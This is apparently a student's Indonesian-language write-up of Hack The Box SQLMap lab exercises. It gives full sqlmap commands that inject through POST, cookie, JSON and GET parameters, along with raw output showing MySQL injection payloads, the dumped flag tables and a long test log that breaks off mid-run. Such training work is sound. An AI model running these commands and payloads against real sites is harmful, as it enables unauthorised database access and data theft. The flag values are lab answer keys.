
jawaban pertama : UNION query-based

# Soal :  Menjalankan SQLMap pada Permintaan HTTP


pertama saya ini copy dengan curl di bagian network nya: 

```bash
sqlmap 'http://94.237.59.63:48197/case2.php' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.59.63:48197/case2.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://94.237.59.63:48197' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --data-raw 'id=1' --batch -T flag2 --dump



       __H__
 ___ ___[']_____ ___ ___  {1.8.3#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:45:32 /2024-08-21/

[15:45:33] [INFO] resuming back-end DBMS 'mysql' 
[15:45:33] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 2682=2682

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 6551 FROM(SELECT COUNT(*),CONCAT(0x71706b7071,(SELECT (ELT(6551=6551,1))),0x7171766271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 1829 FROM (SELECT(SLEEP(5)))sfSu)

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71706b7071,0x62456a65634f4763787a596351444f565a4d54704f735a634c76445344694c675672557579496e55,0x7171766271),NULL,NULL,NULL,NULL,NULL-- -
---
[15:45:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[15:45:35] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[15:45:35] [INFO] fetching current database
[15:45:35] [INFO] fetching columns for table 'flag2' in database 'testdb'
[15:45:35] [WARNING] potential permission problems detected ('command denied')
[15:45:36] [INFO] fetching entries for table 'flag2' in database 'testdb'
Database: testdb
Table: flag2
[1 entry]
+----+----------------------------------------+
| id | content                                |
+----+----------------------------------------+
| 1  | HTB{700_much_c0n6r475_0n_p057_r3qu357} |
+----+----------------------------------------+

[15:45:37] [INFO] table 'testdb.flag2' dumped to CSV file '/home/aexon/.local/share/sqlmap/output/94.237.59.63/dump/testdb/flag2.csv'
[15:45:37] [INFO] fetched data logged to text files under '/home/aexon/.local/share/sqlmap/output/94.237.59.63'

[*] ending @ 15:45:37 /2024-08-21/

```

sql injection ke dua berada di bagian cookie, mari exploit

```bash
┌─[aexon@parrot]─[~]
└──╼ $sqlmap 'http://94.237.59.63:48197/case3.php' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.59.63:48197/case3.php' -H 'Connection: keep-alive' -H 'Cookie: id=1*' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --batch -T flag3 --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.3#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:48:57 /2024-08-21/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[15:48:57] [INFO] resuming back-end DBMS 'mysql' 
[15:48:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3062=3062

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 7681 FROM(SELECT COUNT(*),CONCAT(0x71706a7171,(SELECT (ELT(7681=7681,1))),0x716a717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 6317 FROM (SELECT(SLEEP(5)))WkMl)

    Type: UNION query
    Title: Generic UNION query (NULL) - 10 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706a7171,0x6465426242536a615758514d77524a6572754c48696567704b624e444942646d6d78477768556e57,0x716a717871)-- -
---
[15:49:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[15:49:00] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[15:49:00] [INFO] fetching current database
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
[15:49:01] [INFO] fetching columns for table 'flag3' in database 'testdb'
[15:49:01] [WARNING] potential permission problems detected ('command denied')
[15:49:01] [INFO] fetching entries for table 'flag3' in database 'testdb'
Database: testdb
Table: flag3
[1 entry]
+----+------------------------------------------+
| id | content                                  |
+----+------------------------------------------+
| 1  | HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475} |
+----+------------------------------------------+

[15:49:02] [INFO] table 'testdb.flag3' dumped to CSV file '/home/aexon/.local/share/sqlmap/output/94.237.59.63/dump/testdb/flag3.csv'
[15:49:02] [INFO] fetched data logged to text files under '/home/aexon/.local/share/sqlmap/output/94.237.59.63'

[*] ending @ 15:49:02 /2024-08-21/
```


untuk soal selanjut nya ada kerentanan ketika post data json, mari kita exploit post data json tersebut.

```bash
┌─[aexon@parrot]─[~]
└──╼ $sqlmap 'http://94.237.59.63:48197/case4.php' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.59.63:48197/case4.php' -H 'Content-Type: application/json' -H 'Origin: http://94.237.59.63:48197' -H 'Connection: keep-alive' --data='{"id":1*}' --batch -T flag4 --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.3#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:51:59 /2024-08-21/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[15:51:59] [INFO] resuming back-end DBMS 'mysql' 
[15:51:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"id":"1 AND 3722=3722"}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"id":"1 AND (SELECT 9581 FROM(SELECT COUNT(*),CONCAT(0x7178766a71,(SELECT (ELT(9581=9581,1))),0x716b716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"}

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: {"id":"1;SELECT SLEEP(5)#"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"1 AND (SELECT 8392 FROM (SELECT(SLEEP(5)))CJMg)"}

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: {"id":"1 UNION ALL SELECT NULL,CONCAT(0x7178766a71,0x6d4349696d475767796a58567152556e7075636a444576576c6c5a5146496743474a765a70757047,0x716b716a71),NULL,NULL,NULL,NULL-- -"}
---
[15:52:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[15:52:00] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[15:52:00] [INFO] fetching current database
[15:52:00] [INFO] fetching columns for table 'flag4' in database 'testdb'
[15:52:01] [WARNING] potential permission problems detected ('command denied')
[15:52:02] [INFO] fetching entries for table 'flag4' in database 'testdb'
Database: testdb
Table: flag4
[1 entry]
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{j450n_v00rh335_53nd5_6r475} |
+----+---------------------------------+

[15:52:02] [INFO] table 'testdb.flag4' dumped to CSV file '/home/aexon/.local/share/sqlmap/output/94.237.59.63/dump/testdb/flag4.csv'
[15:52:02] [INFO] fetched data logged to text files under '/home/aexon/.local/share/sqlmap/output/94.237.59.63'

[*] ending @ 15:52:02 /2024-08-21/

```


# Penyetelan Serangan

solve soal 1

```bash
┌─[aexon@parrot]─[~]
└──╼ $sqlmap 'http://94.237.59.199:40573/case5.php?id=1' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.59.63:48197/case5.php' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --batch --level=3 --risk=3 -T flag5 --dump  --fresh-queries 
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.3#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:30:56 /2024-08-21/

[17:30:56] [INFO] testing connection to the target URL
[17:30:57] [INFO] testing if the target URL content is stable
[17:30:57] [INFO] target URL content is stable
[17:30:57] [INFO] testing if GET parameter 'id' is dynamic
[17:30:58] [INFO] GET parameter 'id' appears to be dynamic
[17:31:00] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[17:31:00] [INFO] testing for SQL injection on GET parameter 'id'
[17:31:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:31:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[17:31:25] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --string="28")
[17:31:34] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) value? [Y/n] Y
[17:31:34] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[17:31:35] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[17:31:35] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[17:31:36] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[17:31:36] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[17:31:37] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[17:31:37] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[17:31:38] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[17:31:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:31:39] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:31:39] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:31:40] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:31:40] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[17:31:40] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[17:31:41] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:31:41] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[17:31:42] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[17:31:42] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[17:31:43] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[17:31:43] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[17:31:44] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[17:31:44] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[17:31:45] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[17:31:45] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[17:31:45] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[17:31:46] [INFO] testing 'Generic inline queries'
[17:31:46] [INFO] testing 'MySQL inline queries'
[17:31:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[17:31:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[17:31:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[17:31:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[17:31:49] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[17:31:49] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[17:31:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:31:50] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[17:32:01] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' injectable 
[17:32:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:32:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:32:10] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[17:32:22] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[17:32:32] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[17:32:45] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[17:32:55] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[17:33:06] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[17:33:18] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[17:33:28] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[17:33:46] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[17:33:57] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[17:34:07] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[17:34:17] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[17:34:27] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[17:34:41] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[17:34:50] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[17:34:50] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 440 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: id=-2513 OR 6577=6577

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: id=1 OR (SELECT 1315 FROM (SELECT(SLEEP(5)))CJeJ)
---
[17:34:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[17:34:58] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[17:34:58] [INFO] fetching current database
[17:34:58] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[17:34:58] [INFO] retrieved: testdb
[17:35:17] [INFO] fetching columns for table 'flag5' in database 'testdb'
[17:35:17] [INFO] retrieved: 2
[17:35:21] [INFO] retrieved: id
[17:35:28] [INFO] retrieved: content
[17:35:49] [INFO] fetching entries for table 'flag5' in database 'testdb'
[17:35:49] [INFO] fetching number of entries for table 'flag5' in database 'testdb'
[17:35:49] [INFO] retrieved: 1
[17:35:52] [INFO] retrieved: HTB{700_much_r15k_
[17:37:53] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[17:37:54] [WARNING] unexpected response detected. Will use (extra) validation step in similar cases
[17:37:54] [WARNING] unexpected HTTP code '200' detected. Will use (extra) validation step in similar cases
bu7_w0r:h_17}
[17:39:02] [INFO] retrieved: 1
Database: testdb
Table: flag5
[1 entry]
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{700_much_r15k_bu7_w0r7h_17} |
+----+---------------------------------+

[17:39:13] [INFO] table 'testdb.flag5' dumped to CSV file '/home/aexon/.local/share/sqlmap/output/94.237.59.199/dump/testdb/flag5.csv'
[17:39:13] [INFO] fetched data logged to text files under '/home/aexon/.local/share/sqlmap/output/94.237.59.199'

[*] ending @ 17:39:13 /2024-08-21/

```

***solve lab 6***

di sini saya menggunakan prefix \` karena di website akan muncul error sql

```bash
┌─[aexon@parrot]─[~]
└──╼ $sqlmap 'http://94.237.48.20:45605/case6.php?col=id*' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.48.20:45605/case6.php' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --level 3 --risk 3 --prefix="\`" --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.3#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:00:33 /2024-08-21/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[23:00:33] [INFO] testing connection to the target URL
[23:00:34] [INFO] checking if the target is protected by some kind of WAF/IPS
[23:00:34] [INFO] testing if the target URL content is stable
[23:00:35] [INFO] target URL content is stable
[23:00:35] [INFO] testing if URI parameter '#1*' is dynamic
[23:00:35] [INFO] URI parameter '#1*' appears to be dynamic
[23:00:36] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
[23:00:36] [INFO] heuristic (XSS) test shows that URI parameter '#1*' might be vulnerable to cross-site scripting (XSS) attacks
[23:00:36] [INFO] testing for SQL injection on URI parameter '#1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) value? [Y/n] Y
[23:00:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:00:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[23:01:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[23:01:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[23:01:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[23:01:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[23:01:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[23:01:40] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[23:01:41] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[23:01:42] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[23:01:43] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[23:01:44] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[23:01:45] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[23:01:45] [WARNING] reflective value(s) found and filtering out
[23:02:02] [INFO] testing 'Generic inline queries'
[23:02:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[23:02:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[23:02:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[23:02:05] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[23:02:28] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[23:02:53] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[23:03:31] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[23:04:17] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[23:04:46] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[23:05:13] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[23:05:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[23:05:43] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[23:05:44] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[23:05:45] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[23:05:46] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[23:05:47] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[23:05:47] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[23:05:49] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[23:05:51] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[23:05:51] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[23:05:51] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[23:05:52] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[23:05:52] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[23:06:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[23:06:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[23:06:35] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[23:06:49] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[23:07:03] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[23:07:20] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[23:07:33] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[23:07:48] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[23:08:03] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[23:08:15] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[23:08:33] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[23:08:48] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[23:09:01] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[23:09:15] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[23:09:31] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[23:09:48] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[23:09:48] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[23:10:00] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[23:10:00] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[23:10:01] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[23:10:01] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[23:10:02] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[23:10:02] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[23:10:02] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[23:10:03] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[23:10:04] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[23:10:05] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[23:10:06] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[23:10:07] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[23:10:08] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[23:10:08] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[23:10:10] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[23:10:10] [INFO] testing 'MySQL inline queries'
[23:10:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[23:10:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[23:10:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[23:10:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
